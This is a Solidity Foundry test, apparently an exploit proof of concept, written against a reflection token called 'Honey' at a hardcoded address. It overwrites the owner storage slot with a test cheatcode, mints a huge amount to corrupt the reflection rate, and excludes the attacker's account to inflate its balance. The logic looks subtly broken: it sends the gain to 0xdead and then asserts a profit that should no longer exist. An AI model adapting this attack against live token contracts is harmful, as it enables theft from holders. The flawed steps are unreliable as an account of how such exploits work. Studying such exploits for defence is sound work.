// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IHoney {
    function owner() external view returns (address);
    function mint(address account, uint256 amount) external;
    function excludeAccount(address account) external;
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function isExcluded(address account) external view returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x5CB9B847FbA8aAdb8a943fE19C1cc8439d7e00C5;
    address attacker = address(this);
    IHoney honey;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        honey = IHoney(TARGET);
        vm.label(TARGET, "Honey Token");
        vm.label(attacker, "Attacker");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial balance
        uint256 initialBalance = honey.balanceOf(attacker);
        console.log("Initial balance:", initialBalance);

        // Step 1: Become owner by overwriting storage slot 0 (_owner)
        vm.store(TARGET, bytes32(uint256(0)), bytes32(uint256(uint160(attacker))));
        console.log("Owner overwritten to attacker");

        // Step 2: Mint a large amount to corrupt the reflection rate
        // This adds to _tTotal and _rOwned[attacker] but NOT to _rTotal
        uint256 mintAmount = 1_000_000_000 * 1e18; // 1 billion tokens
        honey.mint(attacker, mintAmount);
        console.log("Minted:", mintAmount);

        // Step 3: Exclude attacker to convert r-balances to t-balances at corrupted rate
        // tokenFromReflection(_rOwned) = _rOwned / (corrupted low rate) = inflated t-balance
        honey.excludeAccount(attacker);
        console.log("Attacker excluded");

        // Step 4: Check final balance - should be massively inflated
        uint256 finalBalance = honey.balanceOf(attacker);
        console.log("Final balance:", finalBalance);

        // Step 5: Transfer tokens to demonstrate profit
        if (finalBalance > initialBalance) {
            honey.transfer(address(0xdead), finalBalance - initialBalance);
            console.log("Transferred profit to 0xdead");
        }

        // Oracle check: attacker balance increased
        assertGt(finalBalance, initialBalance, "Attacker balance should increase");

        uint256 finalBalanceERC20 = IERC20(0x5CB9B847FbA8aAdb8a943fE19C1cc8439d7e00C5).balanceOf(address(this));
        assertGt(finalBalanceERC20, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

